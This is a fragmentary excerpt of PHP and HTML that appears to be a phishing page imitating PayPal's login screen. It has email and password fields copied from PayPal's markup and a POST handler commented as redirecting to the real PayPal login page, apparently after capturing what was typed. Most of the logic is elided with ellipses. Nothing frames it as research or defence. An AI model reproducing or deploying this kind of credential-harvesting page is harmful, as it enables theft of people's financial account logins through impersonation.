...
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    ...
    // Redirect to the main PayPal login page
...
a, a:link, a:visited {
   ...
   <div id="main" class="main " role="main">
                    ...
                    <div id="passwordSection" class="clearfix">
                        <div class="textInput" id="login_emaildiv">
                            <div class="fieldWrapper">
                                ...
                                <input id="email" name="login_email" type="email" class="hasHelp  validateEmpty " placeholder="Email address or Phone number" required>
                           </div>
                        </div>
                     ...
                     <div class="textInput lastInputField" id="login_passworddiv">
                         <div class="fieldWrapper"><label for="password" class="fieldLabel">Password</label>
                            <input id="password" name="login_password" type="password" class="hasHelp  validateEmpty " placeholder="Password" required><p onclick="showP()" class="show">SHOW</p>
                       </div>
                     </div>
                   </div>
    ...
    // Check if the password input exists and is of type "password"
